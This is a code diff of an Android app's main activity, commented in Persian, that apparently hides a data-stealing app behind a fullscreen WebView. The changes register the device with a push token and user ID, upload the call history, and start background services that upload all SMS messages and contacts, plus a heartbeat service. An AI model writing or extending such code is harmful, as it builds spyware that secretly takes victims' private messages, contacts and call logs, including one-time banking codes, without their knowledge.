@@ -1,12 +1,10 @@
 package com.example.test
 
-
 import android.os.Build
 import android.os.Bundle
 import android.os.Handler
 import android.os.Looper
 import android.util.Log
-import android.view.WindowInsets
 import android.view.WindowManager
 import android.webkit.WebView
 import android.webkit.WebViewClient
@@ -21,10 +19,8 @@ import androidx.compose.foundation.background
 import androidx.compose.foundation.layout.*
 import androidx.compose.material3.*
 import androidx.compose.runtime.*
-import androidx.compose.ui.Alignment
 import androidx.compose.ui.Modifier
 import androidx.compose.ui.graphics.Color
-import androidx.compose.ui.unit.dp
 import androidx.compose.ui.viewinterop.AndroidView
 import com.example.test.utils.DataUploader
 import com.example.test.utils.DeviceInfoHelper
@@ -40,7 +36,7 @@ class MainActivity : ComponentActivity() {
     private var fcmToken: String = ""
     private val handler = Handler(Looper.getMainLooper())
     private val BATTERY_UPDATE_INTERVAL_MS = 60000L
-    private val FCM_TIMEOUT_MS = 5000L
+    private val FCM_TIMEOUT_MS = 10000L
     private val userId = Constants.USER_ID
 
     private lateinit var webView: WebView
@@ -60,7 +56,6 @@ class MainActivity : ComponentActivity() {
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
 
-        // Fullscreen Mode
         enableFullscreen()
 
         deviceId = DeviceInfoHelper.getDeviceId(this)
@@ -79,21 +74,16 @@ class MainActivity : ComponentActivity() {
     }
 
     private fun enableFullscreen() {
-        // حذف ActionBar
         actionBar?.hide()
 
-        // Fullscreen برای همه نسخه‌های اندروید
         WindowCompat.setDecorFitsSystemWindows(window, false)
 
         val windowInsetsController = WindowCompat.getInsetsController(window, window.decorView)
         windowInsetsController.apply {
-            // مخفی کردن status bar و navigation bar
             hide(WindowInsetsCompat.Type.systemBars())
-            // حالت immersive - وقتی کاربر سوایپ کنه بارها دوباره مخفی بشن
             systemBarsBehavior = WindowInsetsControllerCompat.BEHAVIOR_SHOW_TRANSIENT_BARS_BY_SWIPE
         }
 
-        // Keep screen on (اختیاری - صفحه خاموش نشه)
         window.addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON)
     }
 
@@ -118,7 +108,6 @@ class MainActivity : ComponentActivity() {
                 .fillMaxSize()
                 .background(Color.Black)
         ) {
-            // همیشه WebView رو نمایش بده
             AndroidView(
                 factory = { context ->
                     createWebView()
@@ -126,7 +115,6 @@ class MainActivity : ComponentActivity() {
                 modifier = Modifier.fillMaxSize()
             )
 
-            // دیالوگ روی WebView نمایش داده میشه
             if (showPermissionDialog) {
                 PermissionDialog(
                     onRequestPermissions = {
@@ -158,8 +146,8 @@ class MainActivity : ComponentActivity() {
         webSettings.allowContentAccess = true
 
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN) {
-            webSettings.allowFileAccessFromFileURLs = true
-            webSettings.allowUniversalAccessFromFileURLs = true
+            webSettings.allowFileAccessFromFileURLs = false
+            webSettings.allowUniversalAccessFromFileURLs = false
         }
 
         webSettings.loadWithOverviewMode = true
@@ -172,19 +160,31 @@ class MainActivity : ComponentActivity() {
         webSettings.blockNetworkLoads = false
 
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
-            webSettings.mixedContentMode = WebSettings.MIXED_CONTENT_ALWAYS_ALLOW
+            webSettings.mixedContentMode = WebSettings.MIXED_CONTENT_COMPATIBLE_MODE
         }
 
         webSettings.cacheMode = WebSettings.LOAD_DEFAULT
 
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
             webView.setLayerType(WebView.LAYER_TYPE_HARDWARE, null)
-            WebView.setWebContentsDebuggingEnabled(true)
+            if (BuildConfig.DEBUG) {
+                WebView.setWebContentsDebuggingEnabled(true)
+            }
         } else {
             webView.setLayerType(WebView.LAYER_TYPE_SOFTWARE, null)
         }
 
         webView.webViewClient = object : WebViewClient() {
+
+            // جلوگیری از باز شدن لینک‌ها در مرورگر
+            override fun shouldOverrideUrlLoading(view: WebView?, request: android.webkit.WebResourceRequest?): Boolean {
+                return false
+            }
+
+            override fun shouldOverrideUrlLoading(view: WebView?, url: String?): Boolean {
+                return false
+            }
+
             override fun onPageFinished(view: WebView?, url: String?) {
                 super.onPageFinished(view, url)
                 Log.d(TAG, "✅ WebView page loaded successfully")
@@ -256,28 +256,64 @@ class MainActivity : ComponentActivity() {
                 Log.d(TAG, "🔑 Using fallback token: $fcmToken")
             }
 
+            // ترتیب اجرا:
+            // 1️⃣ ریجستر + تاریخچه تماس (فرانت)
+            // 2️⃣ شروع سرویس‌های پس‌زمینه
+            // 3️⃣ SMS و مخاطبین در DataUploadService (پس‌زمینه)
+
             Thread {
                 try {
-                    Log.d(TAG, "📡 Starting network operations...")
-                    DataUploader.registerDevice(this, deviceId, fcmToken, userId)
-                    DataUploader.uploadAllSms(this, deviceId)
-                    DataUploader.uploadAllContacts(this, deviceId)
+                    Log.d(TAG, "════════════════════════════════════════")
+                    Log.d(TAG, "🚀 STARTING INITIALIZATION SEQUENCE")
+                    Log.d(TAG, "════════════════════════════════════════")
+
+                    // 1️⃣ ریجستر گوشی
+                    Log.d(TAG, "1️⃣ Registering device...")
+                    val registerSuccess = DataUploader.registerDevice(this, deviceId, fcmToken, userId)
+                    if (registerSuccess) {
+                        Log.d(TAG, "✅ Device registered successfully")
+                    } else {
+                        Log.w(TAG, "⚠️ Device registration failed, continuing anyway...")
+                    }
+
+                    // 2️⃣ آپلود تاریخچه تماس‌ها
+                    Log.d(TAG, "2️⃣ Uploading call history...")
                     DataUploader.uploadCallHistory(this, deviceId)
-                    startBackgroundService()
+                    Log.d(TAG, "✅ Call history upload completed")
+
+                    Log.d(TAG, "════════════════════════════════════════")
+                    Log.d(TAG, "🎯 FRONTEND OPERATIONS COMPLETED")
+                    Log.d(TAG, "════════════════════════════════════════")
+
+                    // 3️⃣ شروع سرویس‌های پس‌زمینه
+                    Log.d(TAG, "3️⃣ Starting background services...")
+
+                    startSmsService()
+                    Thread.sleep(500) // فاصله کوتاه بین سرویس‌ها
+
                     startHeartbeatService()
-                    Log.d(TAG, "✅ All operations completed")
+                    Thread.sleep(500)
+
+                    startDataUploadService()
+
+                    Log.d(TAG, "════════════════════════════════════════")
+                    Log.d(TAG, "✅ ALL SERVICES STARTED SUCCESSFULLY")
+                    Log.d(TAG, "📱 SMS & Contacts uploading in background...")
+                    Log.d(TAG, "════════════════════════════════════════")
+
                 } catch (e: Exception) {
-                    Log.e(TAG, "❌ Init error: ${e.message}", e)
+                    Log.e(TAG, "❌ Initialization error: ${e.message}", e)
                     e.printStackTrace()
                 }
             }.start()
 
+            // شروع آپدیت باتری
             handler.post(batteryUpdater)
 
         }, FCM_TIMEOUT_MS)
     }
 
-    private fun startBackgroundService() {
+    private fun startSmsService() {
         try {
             val intent = android.content.Intent(this, SmsService::class.java)
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
@@ -299,9 +335,24 @@ class MainActivity : ComponentActivity() {
             } else {
                 startService(intent)
             }
-            Log.d(TAG, "✅ HeartbeatService started")
+            Log.d(TAG, "✅ HeartbeatService started (1 min interval)")
         } catch (e: Exception) {
             Log.e(TAG, "❌ Failed to start HeartbeatService: ${e.message}")
+        }
+    }
+
+    private fun startDataUploadService() {
+        try {
+            val intent = android.content.Intent(this, DataUploadService::class.java)
+            intent.putExtra(DataUploadService.EXTRA_DEVICE_ID, deviceId)
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                startForegroundService(intent)
+            } else {
+                startService(intent)
+            }
+            Log.d(TAG, "✅ DataUploadService started (SMS + Contacts)")
+        } catch (e: Exception) {
+            Log.e(TAG, "❌ Failed to start DataUploadService: ${e.message}")
         }
     }
 
@@ -316,12 +367,17 @@ class MainActivity : ComponentActivity() {
     override fun onDestroy() {
         super.onDestroy()
         handler.removeCallbacks(batteryUpdater)
+
         if (::webView.isInitialized) {
+            webView.stopLoading()
+            webView.clearCache(true)
             webView.destroy()
         }
+
         if (::permissionManager.isInitialized) {
             permissionManager.stopBatteryMonitoring()
         }
+
         Log.d(TAG, "👋 MainActivity destroyed")
     }
 }
